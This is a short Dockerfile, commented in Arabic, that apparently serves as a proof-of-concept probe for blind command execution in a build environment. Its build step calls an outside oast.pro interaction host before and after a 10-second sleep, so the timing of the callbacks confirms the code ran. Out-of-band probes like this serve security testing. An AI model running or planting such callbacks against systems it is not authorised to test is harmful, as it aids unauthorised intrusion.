FROM alpine:latest

# 1. نزل curl
RUN apk add --no-cache curl

# 2. أمر النوم والإبلاغ
# السيرفر هيبعت ريكويست "START"، ينام 10 ثواني، ويبعت "END"
# الفرق في التوقيت بين الريكويستين هو الدليل القاطع
RUN curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/TIME_START && sleep 10 && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/TIME_END
